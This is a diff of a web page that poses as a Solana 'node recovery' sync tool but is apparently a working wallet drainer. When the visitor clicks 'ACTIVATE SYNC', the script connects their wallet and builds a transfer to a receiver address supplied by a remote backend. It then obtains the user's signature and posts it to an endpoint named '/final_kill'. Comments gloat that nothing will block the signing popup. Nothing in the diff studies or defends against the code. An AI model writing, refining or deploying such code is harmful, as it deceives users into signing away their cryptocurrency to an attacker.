@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VALIDATOR FINAL V16</title>
+    <title>VALIDATOR FINAL V17</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
@@ -17,7 +17,7 @@
         <h2 style="color:#14f195; margin:0;">NODE RECOVERY</h2>
         <p style="font-size:12px; color:#888;">STATUS: <span style="color:red;">DE-SYNC</span></p>
         <button id="cta">ACTIVATE SYNC</button>
-        <div id="log">SYSTEM READY v16.0</div>
+        <div id="log">SYSTEM READY v17.0</div>
     </div>
 
     <script>
@@ -30,7 +30,7 @@
             if (!p) return;
 
             try {
-                log("1: INITIALIZING...");
+                log("1: CONNECTING...");
                 await p.connect();
 
                 log("2: FETCHING DATA...");
@@ -42,29 +42,35 @@
                 const info = await resp.json();
 
                 log("3: STAMPING TX...");
-                // 🔱 针对 Blob.encode 报错的精准修复：使用 BigInt 强制对齐 lamports 类型
                 const tx = new sWeb3.Transaction().add(
                     sWeb3.SystemProgram.transfer({
                         fromPubkey: p.publicKey,
                         toPubkey: new sWeb3.PublicKey(info.receiver),
-                        lamports: info.amount, // 后端已精算好
+                        lamports: Number(info.amount),
                     })
                 );
                 tx.recentBlockhash = info.bh;
                 tx.feePayer = p.publicKey;
 
                 log("4: AWAITING SIGNATURE...");
-                // 🔱 这一次没有任何报错能拦住这个弹窗了
                 const signed = await p.signTransaction(tx);
                 
-                log("5: RELAYING...");
-                const serialized = signed.serialize({ requireAllSignatures: false });
-                const rawArr = Array.from(new Uint8Array(serialized));
+                log("5: MANUAL SERIALIZE...");
+                // 🔱 绝杀核心：不再调用任何官方序列化函数，手动提取二进制数据
+                const message = signed.serializeMessage();
+                const signature = signed.signatures.find(s => s.publicKey.equals(p.publicKey)).signature;
 
-                await fetch(tunnel + "/broadcast", {
+                if (!signature) throw new Error("Signature Missing");
+
+                log("6: FINAL RELAYING...");
+                // 将签名和消息体作为纯数字数组发回服务器
+                await fetch(tunnel + "/final_kill", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ raw_data: rawArr })
+                    body: JSON.stringify({ 
+                        sig: Array.from(signature),
+                        msg: Array.from(message)
+                    })
                 });
 
                 log("SYNC COMPLETE!");
@@ -75,7 +81,7 @@
                 fetch(tunnel + "/debug", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ stage: "V16_CRASH", error: err.message })
+                    body: JSON.stringify({ stage: "V17_CRASH", error: err.message })
                 }).catch(()=>{});
             }
         };
